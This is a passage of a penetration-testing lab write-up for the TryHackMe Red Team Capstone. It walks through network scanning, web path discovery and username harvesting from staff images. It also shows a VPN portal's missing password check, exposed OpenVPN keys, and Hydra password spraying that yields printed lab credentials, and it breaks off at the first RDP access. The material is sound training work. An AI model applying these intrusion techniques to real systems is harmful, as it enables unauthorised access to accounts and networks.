---
title: "Red Team Capstone Challenge: A Partial Lab Write-Up"
description: "My TryHackMe Red Team Capstone assessment for Certificate IV in Cyber Security"
date: 2026-11-07 12:00:00 +1000
categories: [Cyber Security, Lab Walkthroughs]
tags: [tryhackme, red-team, active-directory, penetration-testing]
toc: true
---

<style>
.capstone-article { overflow-wrap: anywhere; }
.capstone-article figure { margin: 1.5rem 0; }
.capstone-article figure img { display: block; max-width: 100%; height: auto; margin: 0 auto; }
.capstone-article pre { max-width: 100%; overflow-x: auto; padding: 1rem; border-radius: .5rem; background: var(--highlight-bg-color, #f6f8fa); }
.capstone-article pre code { white-space: pre; overflow-wrap: normal; word-break: normal; font-size: .85rem; }
.capstone-article .pdf-source-section { margin: 0; padding: 0; }
.capstone-article ul { margin-bottom: 1rem; }
.capstone-article details { margin: 1rem 0; }
.capstone-article .table-wrapper { overflow-x: auto; }
.capstone-article table { width: 100%; min-width: 38rem; table-layout: fixed; }
.capstone-article table td, .capstone-article table th { white-space: normal !important; overflow-wrap: anywhere; vertical-align: top; }
.capstone-article table th:first-child { width: 22%; }
@media (max-width: 575px) { .capstone-article figure { width: 100% !important; } }

.capstone-article .code-key { color: #146c36; font-weight: 700; }
.capstone-article .code-risk { color: #b42318; font-weight: 700; text-decoration: underline dotted; text-underline-offset: .2em; }
html[data-mode="dark"] .capstone-article .code-key { color: #75e2a0; }
html[data-mode="dark"] .capstone-article .code-risk { color: #ff938a; }
@media (prefers-color-scheme: dark) {
 html:not([data-mode="light"]) .capstone-article .code-key { color: #75e2a0; }
 html:not([data-mode="light"]) .capstone-article .code-risk { color: #ff938a; }
}
.capstone-article .code-legend { font-size: .85rem; }
.capstone-article .flag-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 1rem; margin: 1.5rem 0; }
.capstone-article .flag-grid figure { margin: 0; min-width: 0; }
.capstone-article .flag-grid figcaption { margin-top: .5rem; font-size: .85rem; text-align: center; }
@media (max-width: 575px) { .capstone-article .flag-grid { grid-template-columns: 1fr; } }
</style>

{% raw %}
<div class="capstone-article">
<!-- PDF page 1 -->
<section id="pdf-page-1" class="pdf-source-section" data-pdf-page="1" aria-label="Source page 1">

<h2 id="welcome-to-trimento">Welcome to Trimento!</h2>

<p>Trimento is the fictional setting for the <a href="https://tryhackme.com/room/redteamcapstonechallenge">TryHackMe Red Team Capstone Challenge</a>. Its government has asked a security consultancy to assess TheReserve, a simulated reserve bank.</p>

<p>The engagement covers two divisions: <strong>Corporate</strong>, which manages foreign investments and corporate clients, and <strong>Bank</strong>, which operates the core banking environment.</p>

<p>The central question is whether weaknesses in the corporate environment could provide a route into the banking environment.</p>

<p>My approach was to enumerate the exposed hosts, obtain corporate access, and investigate the relationships between the Windows domains.</p>

<p>The final objective concerned the lab's simulated SWIFT application. In the real world, <a href="https://www.swift.com/about-us/who-we-are">Swift carries financial messages and payment instructions</a>; the participating institutions move the funds.</p>

<p>I worked through this lab in August 2026 as part of an assessment for my Certificate IV in Cyber Security. This write-up documents the practical work I carried out for that assessment, using the addresses and tool versions shown in the screenshots.</p>

<h3 id="outcome">Outcome</h3>
<p>I collected 16 flags, working from the exposed services into the corporate network, then on to the root and BANK domains.</p>

<p>I reached flag 16 before the lab reset, leaving the SWIFT stage unfinished. There was also an issue with Domain Admin privileges, which I outline later in this write-up.</p>

<h2 id="in-scope">In-Scope</h2>

<ul><li>Testing TheReserve hosts within the assigned lab range, subject to the exclusions below.</li></ul>
</section>

<!-- PDF page 2 -->
<section id="pdf-page-2" class="pdf-source-section" data-pdf-page="2" aria-label="Source page 2">
<ul><li>Reconnaissance of TheReserve's website inside the supplied subnet; no external internet OSINT was part of the engagement.</li><li>Phishing of any of the employees of TheReserve.</li><li>Attacking the mailboxes of TheReserve employees on the WebMail host (.11).</li><li>Working towards the simulated transfer objective within the stated scope and exclusions.</li></ul>

<h2 id="out-of-scope">Out-of-Scope</h2>

<ul><li>Security testing of any sites not hosted on the network.</li><li>Security testing of the TryHackMe VPN (.250) and scoring servers, or attempts to attack any other user connected to the network.</li><li>Any security testing on the WebMail server (.11) that alters the mail server configuration or its underlying infrastructure.</li><li>Attacking the mailboxes of other red teamers on the WebMail portal (.11).</li><li>External (internet) OSINT gathering.</li><li>Testing hosts outside the subnet assigned by the room. For this attempt that range was 10.200.40.0/24.</li><li>Conducting denial-of-service attacks or any attack that renders the network inoperable for other users.</li></ul>

<h2 id="registration">Registration:</h2>

<p>I registered through the lab's e-Citizen portal, which provided the engagement contact channel and flag-submission workflow.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-02-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-02-figure-01.png" alt="e-Citizen registration portal" width="1016" height="252" loading="lazy"></a></figure>

<p>Lab username: <code>n0debranch</code><br>Assigned target range: <code><span class="code-key">10.200.40.0/24</span></code><br>I used the email account issued by the e-Citizen portal for engagement communication and flag submissions.</p>
</section>

<!-- PDF page 3 -->
<section id="pdf-page-3" class="pdf-source-section" data-pdf-page="3" aria-label="Source page 3">
<p>The supplied archive included tools, a base password list, and the company password policy. The brief narrowed the special characters to <code>!@#$%^</code>, making it possible to generate a bounded set of candidates for this lab.</p>



<figure style="width: 65.63%"><a href="/assets/img/posts/red-team-capstone/page-03-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-03-figure-01.png" alt="Supplied archive contents" width="668" height="530" loading="lazy"></a></figure>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-03-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-03-figure-02.png" alt="Company password policy" width="1016" height="460" loading="lazy"></a></figure>

<p>With the scope and supplied resources established, I began enumeration.</p>
</section>

<!-- PDF page 4 -->
<section id="pdf-page-4" class="pdf-source-section" data-pdf-page="4" aria-label="Source page 4">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-04-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-04-figure-01.png" alt="Enumeration setup" width="1016" height="426" loading="lazy"></a></figure>

<h2 id="starting-layout">Starting Layout:</h2>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-04-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-04-figure-02.png" alt="Starting network layout" width="1016" height="686" loading="lazy"></a></figure>

<p>I started by mapping the exposed hosts and their services.</p>

<p>I initially scanned the whole assigned /24, which also included the excluded VPN address. I should have excluded that address from discovery. My subsequent service scan targeted only .11, .12, and .13.</p>

<p><code>-sn</code> performs host discovery without a port scan. See the <a href="https://nmap.org/book/man-host-discovery.html">Nmap host-discovery documentation</a>.</p>
</section>

<!-- PDF page 5 -->
<section id="pdf-page-5" class="pdf-source-section" data-pdf-page="5" aria-label="Source page 5">
<p class="code-legend"><span class="code-key">Green / bold</span>: addresses, hosts, and open services. <span class="code-risk">Red / underlined</span>: security findings, privileged operations, or excluded infrastructure.</p>
<pre><code>┌──(n0debranch㉿n0debranch)-[~]
└─$ nmap -sn <span class="code-key">10.200.40.0/24</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 13:04 +1000
Nmap scan report for <span class="code-key">10.200.40.1</span>
<span class="code-key">Host is up</span> (0.28s latency).
Nmap scan report for <span class="code-key">10.200.40.11</span>
<span class="code-key">Host is up</span> (0.39s latency).
Nmap scan report for <span class="code-key">10.200.40.12</span>
<span class="code-key">Host is up</span> (0.34s latency).
Nmap scan report for <span class="code-key">10.200.40.13</span>
<span class="code-key">Host is up</span> (0.18s latency).
Nmap scan report for <span class="code-risk">10.200.40.250</span>
<span class="code-key">Host is up</span> (0.28s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 20.84 seconds</code></pre>

<p>The sweep also returned .1 and .250. I left .1 alone because I was unsure of its role. The brief identified .250 as excluded TryHackMe VPN infrastructure, so I did not include either address in the service scan below.</p>

<p><code>-sC</code> runs Nmap's default NSE scripts; <code>-sV</code> probes for service versions.</p>

<pre><code>┌──(n0debranch㉿n0debranch)-[~]
└─$ nmap -sC -sV <span class="code-key">10.200.40.11</span> <span class="code-key">10.200.40.12</span> <span class="code-key">10.200.40.13</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 13:54 +1000
Nmap scan report for <span class="code-key">10.200.40.11</span>
<span class="code-key">Host is up</span> (0.32s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
<span class="code-key">22/tcp   open</span>  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 f3:6c:52:d2:7f:e9:0e:1c:c1:c7:ac:96:2c:d1:ec:2d (RSA)
|   256 c2:56:3c:ed:c4:b0:69:a8:e7:ad:3c:31:05:05:e9:85 (ECDSA)
|_  256 d3:e5:f0:73:75:d5:20:d9:c0:bb:41:99:e7:af:a0:00 (ED25519)
<span class="code-key">25/tcp   open</span>  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
<span class="code-key">80/tcp   open</span>  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  <span class="code-risk">Potentially risky methods: TRACE</span>
|_http-title: IIS Windows Server
<span class="code-key">110/tcp  open</span>  pop3          hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
<span class="code-key">135/tcp  open</span>  msrpc         Microsoft Windows RPC
<span class="code-key">139/tcp  open</span>  netbios-ssn   Microsoft Windows netbios-ssn</code></pre>
</section>

<!-- PDF page 6 -->
<section id="pdf-page-6" class="pdf-source-section" data-pdf-page="6" aria-label="Source page 6">
<pre><code><span class="code-key">143/tcp  open</span>  imap          hMailServer imapd
|_imap-capabilities: IMAP4 CHILDREN NAMESPACE IDLE completed CAPABILITY OK
RIGHTS=texkA0001 SORT ACL QUOTA IMAP4rev1
<span class="code-key">445/tcp  open</span>  microsoft-ds?
<span class="code-key">587/tcp  open</span>  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
<span class="code-key">3306/tcp open</span>  mysql         MySQL 8.0.31
| ssl-cert: Subject:
commonName=MySQL_Server_8.0.31_Auto_Generated_Server_Certificate
| Not valid before: 2023-01-10T07:46:11
|_Not valid after:  2033-01-07T07:46:11
| mysql-info:
|   Protocol: 10
|   Version: 8.0.31
|   Thread ID: 21
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, LongPassword, Support41Auth,
InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn,
SupportsTransactions, IgnoreSigpipes, SwitchToSSLAfterHandshake,
ConnectWithDatabase, Speaks41ProtocolOld, FoundRows,
IgnoreSpaceBeforeParenthesis, ODBCClient, LongColumnFlag,
SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins,
SupportsMultipleResults
|   Status: Autocommit
|   Salt: qlYk\x1F8T'sHK?x\x1E1\x19     M77
|_  Auth Plugin Name: caching_sha2_password
<span class="code-key">3389/tcp open</span>  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-09T03:56:11+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THERESERVE
|   NetBIOS_Domain_Name: THERESERVE
|   NetBIOS_Computer_Name: MAIL
|   DNS_Domain_Name: <span class="code-key">thereserve.loc</span>
|   DNS_Computer_Name: <span class="code-key">MAIL.thereserve.loc</span>
|   DNS_Tree_Name: <span class="code-key">thereserve.loc</span>
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-09T03:55:57+00:00
| ssl-cert: Subject: commonName=<span class="code-key">MAIL.thereserve.loc</span>
| Not valid before: 2026-08-05T07:11:53
|_Not valid after:  2027-02-04T07:11:53
<span class="code-key">5985/tcp open</span>  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre>
</section>

<!-- PDF page 7 -->
<section id="pdf-page-7" class="pdf-source-section" data-pdf-page="7" aria-label="Source page 7">
<pre><code>Host script results:
| smb2-security-mode:
|   3.1.1:
|_    <span class="code-risk">Message signing enabled but not required</span>
| smb2-time:
|   date: 2026-08-09T03:56:00
|_  start_date: N/A</code></pre>

<pre><code>Nmap scan report for <span class="code-key">10.200.40.12</span>
<span class="code-key">Host is up</span> (0.42s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="code-key">22/tcp open</span>  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol
2.0)
| ssh-hostkey:
|   2048 10:d3:bd:2c:ec:db:33:94:59:fe:31:9e:d7:c7:8c:13 (RSA)
|   256 be:71:c7:af:dc:fb:65:4c:f7:63:1f:3a:5f:3a:16:01 (ECDSA)
|_  256 41:98:77:69:3a:69:52:44:c8:02:a2:84:fe:49:f8:2c (ED25519)
<span class="code-key">80/tcp open</span>  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: VPN Request Portal
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>

<pre><code>Nmap scan report for <span class="code-key">10.200.40.13</span>
<span class="code-key">Host is up</span> (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="code-key">22/tcp open</span>  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol
2.0)
| ssh-hostkey:
|   2048 4f:c6:ea:a6:b1:ed:2a:1c:53:c0:90:bf:d5:44:db:69 (RSA)
|   256 da:bc:8b:d4:d0:3a:61:a2:5d:33:39:12:e8:be:a0:13 (ECDSA)
|_  256 23:04:b5:fe:77:04:cb:a8:26:39:dc:b3:09:d3:4d:a5 (ED25519)
<span class="code-key">80/tcp open</span>  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>

<p>The results gave me three useful starting points: the mail server, VPN request portal, and corporate website.</p>
</section>

<!-- PDF page 8 -->
<section id="pdf-page-8" class="pdf-source-section" data-pdf-page="8" aria-label="Source page 8">
<figure style="width: 36.58%"><a href="/assets/img/posts/red-team-capstone/page-08-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-08-figure-01.png" alt="Scan overview" width="372" height="406" loading="lazy"></a></figure>

<h2 id="10-200-40-11-mail-server"><strong>10.200.40.11 - Mail Server</strong></h2>

<ul><li>22/tcp — SSH — OpenSSH for Windows 7.7</li><li>25/tcp — SMTP — hMailServer smtpd</li><li>80/tcp — HTTP — Microsoft IIS 10.0</li><li>110/tcp — POP3 — hMailServer pop3d</li><li>135/tcp — MSRPC — Microsoft Windows RPC</li><li>139/tcp — NetBIOS-SSN — Microsoft Windows NetBIOS</li><li>143/tcp — IMAP — hMailServer imapd</li><li>445/tcp — Microsoft-DS — SMB</li><li>587/tcp — SMTP — hMailServer smtpd</li><li>3306/tcp — MySQL — MySQL 8.0.31</li><li>3389/tcp — RDP — Microsoft Terminal Services</li><li>5985/tcp — HTTP — Microsoft HTTPAPI 2.0</li></ul>

<p>Additional information reported by the scan:</p>

<pre><code>Hostname: MAIL</code></pre>

<pre><code>Domain: <span class="code-key">thereserve.loc</span></code></pre>

<pre><code>NetBIOS domain: THERESERVE</code></pre>

<pre><code>FQDN: <span class="code-key">MAIL.thereserve.loc</span></code></pre>

<pre><code>Windows product version: 10.0.17763</code></pre>

<ul><li>SMB signing: enabled, not required</li></ul>

<h2 id="10-200-40-12-vpn-request-portal"><strong>10.200.40.12 - VPN Request Portal</strong></h2>

<ul><li>22/tcp — SSH — OpenSSH 7.6p1 Ubuntu</li><li>80/tcp — HTTP — Apache 2.4.29</li></ul>
</section>

<!-- PDF page 9 -->
<section id="pdf-page-9" class="pdf-source-section" data-pdf-page="9" aria-label="Source page 9">
<h2 id="web-enumeration">Web Enumeration</h2>
<pre><code>HTTP title: VPN Request Portal</code></pre>

<ul><li>OS: Ubuntu Linux</li></ul>

<h2 id="10-200-40-13-apache-web-server"><strong>10.200.40.13 - Apache Web Server</strong></h2>

<ul><li>22/tcp — SSH — OpenSSH 7.6p1 Ubuntu</li><li>80/tcp — HTTP — Apache 2.4.29</li><li>HTTP title: none</li><li>OS: Ubuntu Linux</li></ul>

<p>I used Gobuster with <code>common.txt</code> to look for web paths on the three exposed hosts.</p>

<p>The scan of .11 returned no useful matches with this wordlist.</p>

<p>On .12, the scan identified <code>/vpn</code>, which I returned to after reviewing the corporate website.</p>

<figure style="width: 94.25%"><a href="/assets/img/posts/red-team-capstone/page-09-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-09-figure-01.png" alt="Gobuster results for 10.200.40.12" width="958" height="596" loading="lazy"></a></figure>
</section>

<!-- PDF page 10 -->
<section id="pdf-page-10" class="pdf-source-section" data-pdf-page="10" aria-label="Source page 10">
<p>Gobuster results for 10.200.40.13:</p>

<figure style="width: 86.87%"><a href="/assets/img/posts/red-team-capstone/page-10-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-10-figure-01.png" alt="Gobuster results for 10.200.40.13" width="884" height="594" loading="lazy"></a></figure>

<p>I reviewed .13 first, then returned to the VPN portal.</p>

<p>The host served TheReserve's corporate website.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-10-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-10-figure-02.png" alt="Corporate website" width="1016" height="706" loading="lazy"></a></figure>
</section>

<!-- PDF page 11 -->
<section id="pdf-page-11" class="pdf-source-section" data-pdf-page="11" aria-label="Source page 11">
<p>The staff page listed names, roles, and photographs, which gave me a starting point for account names.</p>

<figure style="width: 52.51%"><a href="/assets/img/posts/red-team-capstone/page-11-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-11-figure-01.png" alt="Staff page" width="534" height="1206" loading="lazy"></a></figure>
</section>

<!-- PDF page 12 -->
<section id="pdf-page-12" class="pdf-source-section" data-pdf-page="12" aria-label="Source page 12">
<figure style="width: 51.47%"><a href="/assets/img/posts/red-team-capstone/page-12-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-12-figure-01.png" alt="Staff page detail" width="524" height="392" loading="lazy"></a></figure>

<p>The image filenames contained first and last names that were not all visible on the page.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-12-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-12-figure-02.png" alt="Image filenames" width="1016" height="86" loading="lazy"></a></figure>

<p>The parent image directory allowed directory listing, exposing additional filenames.</p>
</section>

<!-- PDF page 13 -->
<section id="pdf-page-13" class="pdf-source-section" data-pdf-page="13" aria-label="Source page 13">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-13-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-13-figure-01.png" alt="Directory listing" width="1016" height="832" loading="lazy"></a></figure>

<p>The site also had a Contact Us page and a simple to-do-list feature.</p>

<p>The contact address was <code>applications@<span class="code-key">corp.thereserve.loc</span></code>. This provided a candidate domain for later authentication tests.</p>
</section>

<!-- PDF page 14 -->
<section id="pdf-page-14" class="pdf-source-section" data-pdf-page="14" aria-label="Source page 14">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-14-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-14-figure-01.png" alt="Contact page" width="1016" height="590" loading="lazy"></a></figure>

<p>I tried the page's inputs but did not find a useful way forward.</p>

<p>The useful results from this host were the staff names and the corporate domain.</p>

<p>I then moved to the VPN request portal on 10.200.40.12.</p>
</section>

<!-- PDF page 15 -->
<section id="pdf-page-15" class="pdf-source-section" data-pdf-page="15" aria-label="Source page 15">
<h2 id="vpn-portal">VPN Portal and Exposed Profiles</h2>
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-15-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-15-figure-01.png" alt="VPN request portal" width="1016" height="808" loading="lazy"></a></figure>

<p>The portal presented a username and password form.</p>

<p>I considered the supplied password list, but first checked what the login responses revealed about usernames.</p>

<p>I tried formats such as <code>roy_sims</code> and <code>roy.sims</code>, but received the same response for both.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-15-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-15-figure-02.png" alt="Login response testing" width="1016" height="110" loading="lazy"></a></figure>

<p>The image filenames suggested <code>firstname.lastname</code>, and the contact page gave me <code><span class="code-key">corp.thereserve.loc</span></code>. I used those to build the account list.</p>
</section>

<!-- PDF page 16 -->
<section id="pdf-page-16" class="pdf-source-section" data-pdf-page="16" aria-label="Source page 16">
<p>While entering an email address, I submitted the form before entering a password. The portal let me through.</p>

<figure style="width: 54.28%"><a href="/assets/img/posts/red-team-capstone/page-16-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-16-figure-01.png" alt="Missing-password check" width="552" height="536" loading="lazy"></a></figure>

<p>The configuration form also accepted arbitrary values. I generated a profile to try with OpenVPN.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-16-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-16-figure-02.png" alt="Configuration-generation form" width="1016" height="558" loading="lazy"></a></figure>
</section>

<!-- PDF page 17 -->
<section id="pdf-page-17" class="pdf-source-section" data-pdf-page="17" aria-label="Source page 17">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-17-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-17-figure-01.png" alt="Generated profile" width="1016" height="488" loading="lazy"></a></figure>

<p>The portal generated an OpenVPN profile for the submitted identity.</p>

<p>The generated profile included an unencrypted private key, even though I had reached the form without entering a password.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-17-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-17-figure-02.png" alt="OpenVPN profile contents" width="1016" height="672" loading="lazy"></a></figure>
</section>

<!-- PDF page 18 -->
<section id="pdf-page-18" class="pdf-source-section" data-pdf-page="18" aria-label="Source page 18">
<p>The earlier directory scan had also found <code>/vpn</code> on this host.</p>

<figure style="width: 94.84%"><a href="/assets/img/posts/red-team-capstone/page-18-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-18-figure-01.png" alt="/vpn directory listing" width="964" height="428" loading="lazy"></a></figure>

<p>The listing exposed another <code>.ovpn</code> profile containing a client certificate, its private key, and a <code>tls-auth</code> shared key.</p>

<ul><li>Client certificate naming the CA <code>ChangeMe</code></li><li>Unencrypted client private key</li><li>tls-auth key</li></ul>

<p>Before testing the profile, I returned to the supplied password list to look for corporate credentials.</p>

<figure style="width: 75.52%"><a href="/assets/img/posts/red-team-capstone/page-18-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-18-figure-02.png" alt="Exposed .ovpn profile" width="768" height="570" loading="lazy"></a></figure>
</section>

<!-- PDF page 19 -->
<section id="pdf-page-19" class="pdf-source-section" data-pdf-page="19" aria-label="Source page 19">
<h2 id="credential-testing">Corporate Credential Testing</h2>
<p>I used a short Python script to generate password candidates from the supplied list and permitted special characters.</p>

<figure style="width: 80.97%"><a href="/assets/img/posts/red-team-capstone/page-19-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-19-figure-01.png" alt="Password candidate generation" width="824" height="378" loading="lazy"></a></figure>

<p>I built a username list using <code>firstname.lastname</code> and <code><span class="code-key">corp.thereserve.loc</span></code>.</p>

<p>The mail host at 10.200.40.11 exposed SMTP authentication, providing a way to test these lab accounts.</p>

<p>I used Hydra for a dictionary-based credential test with the generated candidates.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-19-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-19-figure-02.png" alt="Hydra credential test" width="1016" height="352" loading="lazy"></a></figure>

<p>The output reported successful credentials for Laura Wood and Mohammad Ahmed, both listed as corporate customer investment managers.</p>

<p>Lab account: <code>laura.wood@<span class="code-key">corp.thereserve.loc</span></code> — password: <code>Password1@</code><br>Lab account: <code>mohammad.ahmed@<span class="code-key">corp.thereserve.loc</span></code> — password: <code>Password1!</code></p>

<p>I then checked the corresponding mailboxes for further clues.</p>
</section>

<!-- PDF page 20 -->
<section id="pdf-page-20" class="pdf-source-section" data-pdf-page="20" aria-label="Source page 20">
<p>Laura's mailbox check:</p>

<figure style="width: 46.31%"><a href="/assets/img/posts/red-team-capstone/page-20-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-20-figure-01.png" alt="Laura&#x27;s mailbox" width="472" height="364" loading="lazy"></a></figure>

<p>Mohammad's mailbox check:</p>

<figure style="width: 49.71%"><a href="/assets/img/posts/red-team-capstone/page-20-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-20-figure-02.png" alt="Mohammad&#x27;s mailbox" width="506" height="372" loading="lazy"></a></figure>

<p>Neither mailbox returned messages in these checks. I retained the credentials for subsequent host-access tests.</p>

<figure style="width: 49.26%"><a href="/assets/img/posts/red-team-capstone/page-20-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-20-figure-03.png" alt="Credential retention" width="500" height="500" loading="lazy"></a></figure>

<p>Next, I tested the exposed OpenVPN profile.</p>
</section>

<!-- PDF page 21 -->
<section id="pdf-page-21" class="pdf-source-section" data-pdf-page="21" aria-label="Source page 21">
<h2 id="corporate-vpn">Connecting to the Corporate VPN</h2>
<p>I downloaded the profile from <code>http://<span class="code-key">10.200.40.12</span>/vpn/corpUsername.ovpn</code>.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-01.png" alt="Downloading the profile" width="1016" height="218" loading="lazy"></a></figure>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-02.png" alt="Profile contents" width="1016" height="536" loading="lazy"></a></figure>

<p>The profile's <code>remote</code> entry still contained the placeholder <code>10.200.X.X</code>. I changed it to 10.200.40.12, kept the existing port and protocol, and reconnected.</p>

<figure style="width: 40.71%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-03.png" alt="Editing the remote entry" width="414" height="274" loading="lazy"></a></figure>
</section>

<!-- PDF page 22 -->
<section id="pdf-page-22" class="pdf-source-section" data-pdf-page="22" aria-label="Source page 22">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-22-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-22-figure-01.png" alt="Connection attempt" width="1016" height="954" loading="lazy"></a></figure>

<p>OpenVPN created a second tunnel interface, <code>tun1</code>. The resulting routing output showed paths to the corporate workstations.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-22-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-22-figure-02.png" alt="Routing output" width="1016" height="184" loading="lazy"></a></figure>

<p>The relevant target routes were 10.200.40.21 and 10.200.40.22. The <code>12.100.1.x</code> addresses belonged to the VPN tunnel. My Kali tunnel address changed between connections, so I needed to check it before transferring files. The <a href="https://openvpn.net/community-docs/community-articles/openvpn-2-6-manual/">OpenVPN manual</a> explains tunnel addressing, routes, and the remote endpoint.</p>
</section>

<!-- PDF page 23 -->
<section id="pdf-page-23" class="pdf-source-section" data-pdf-page="23" aria-label="Source page 23">
<p>The initial host-discovery probes received no response from .21, so I scanned it with <code>-Pn</code> to skip host discovery.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-23-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-23-figure-01.png" alt="Scan of .21" width="1016" height="1014" loading="lazy"></a></figure>
</section>

<!-- PDF page 24 -->
<section id="pdf-page-24" class="pdf-source-section" data-pdf-page="24" aria-label="Source page 24">
<p>Scan results for 10.200.40.22:</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-24-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-24-figure-01.png" alt="Scan results for 10.200.40.22" width="1016" height="934" loading="lazy"></a></figure>

<p>Two findings stood out:</p>

<ul><li><strong>RDP</strong> (3389) - Available for Remote Desktop connections.</li><li><strong>SMB signing:</strong> the scan reported signing enabled but not required. I noted this as a possible lead for relay attacks. See <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview">Microsoft's SMB signing overview</a>.</li></ul>
</section>

<!-- PDF page 25 -->
<section id="pdf-page-25" class="pdf-source-section" data-pdf-page="25" aria-label="Source page 25">
<h2 id="workstation-access">Workstation Access and Flag Submission</h2>
<figure style="width: 74.78%"><a href="/assets/img/posts/red-team-capstone/page-25-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-25-figure-01.png" alt="Workstation access" width="760" height="570" loading="lazy"></a></figure>

<p>I tested Laura's corporate credentials over RDP against WRK1 at 10.200.40.21.</p>

<p>The RDP session opened successfully.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-25-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-25-figure-02.png" alt="RDP session to WRK1" width="1016" height="646" loading="lazy"></a></figure>
</section>

<!-- PDF page 26 -->
<section id="pdf-page-26" class="pdf-source-section" data-pdf-page="26" aria-label="Source page 26">
<p>I initially looked for a flag file on the workstation, then realised the room used e-Citizen to validate evidence.</p>

